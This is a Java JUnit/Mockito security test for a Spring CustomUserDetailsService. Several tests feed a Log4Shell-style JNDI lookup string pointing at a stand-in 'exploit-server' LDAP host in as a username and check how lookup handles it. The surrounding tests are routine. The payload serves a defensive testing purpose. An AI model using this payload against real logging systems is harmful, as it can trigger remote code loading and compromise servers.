package com.contrast.frontgateservice.service;

import com.contrast.frontgateservice.entity.User;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UsernameNotFoundException;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.when;

@ExtendWith(MockitoExtension.class)
class CustomUserDetailsServiceSecurityTest {

    @Mock
    private UserService userService;

    @InjectMocks
    private CustomUserDetailsService customUserDetailsService;

    private User testUser;

    @BeforeEach
    void setUp() {
        testUser = new User();
        testUser.setId(1L);
        testUser.setUsername("testuser");
        testUser.setPassword("encodedPassword");
        testUser.setEnabled(true);
    }

    @Test
    void testLoadUserByUsername_WithJNDIInjectionAttempt_ShouldNotThrowException() {
        String maliciousUsername = "${jndi:ldap://exploit-server:1389/serial/CommonsCollections}";
        
        when(userService.findByUsername(maliciousUsername)).thenReturn(null);

        assertThrows(UsernameNotFoundException.class, () -> {
            customUserDetailsService.loadUserByUsername(maliciousUsername);
        });
    }

    @Test
    void testLoadUserByUsername_WithValidUsername_ShouldReturnUserDetails() {
        when(userService.findByUsername("testuser")).thenReturn(testUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername("testuser");

        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
        assertEquals("encodedPassword", userDetails.getPassword());
        assertTrue(userDetails.isEnabled());
    }

    @Test
    void testLoadUserByUsername_WithNonExistentUser_ShouldThrowException() {
        when(userService.findByUsername(anyString())).thenReturn(null);

        assertThrows(UsernameNotFoundException.class, () -> {
            customUserDetailsService.loadUserByUsername("nonexistent");
        });
    }

    @Test
    void testLoadUserByUsername_WithJNDIPatternInUsername_ShouldStillAuthenticate() {
        User userWithJNDIPattern = new User();
        userWithJNDIPattern.setId(2L);
        userWithJNDIPattern.setUsername("${jndi:ldap://exploit-server:1389/serial/CommonsCollections}");
        userWithJNDIPattern.setPassword("encodedPassword");
        userWithJNDIPattern.setEnabled(true);

        when(userService.findByUsername("${jndi:ldap://exploit-server:1389/serial/CommonsCollections}"))
            .thenReturn(userWithJNDIPattern);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername(
            "${jndi:ldap://exploit-server:1389/serial/CommonsCollections}"
        );

        assertNotNull(userDetails);
        assertEquals("${jndi:ldap://exploit-server:1389/serial/CommonsCollections}", userDetails.getUsername());
    }

    @Test
    void testLoadUserByUsername_WithDisabledUser_ShouldReturnDisabledUserDetails() {
        testUser.setEnabled(false);
        when(userService.findByUsername("testuser")).thenReturn(testUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername("testuser");

        assertNotNull(userDetails);
        assertFalse(userDetails.isEnabled());
    }
}
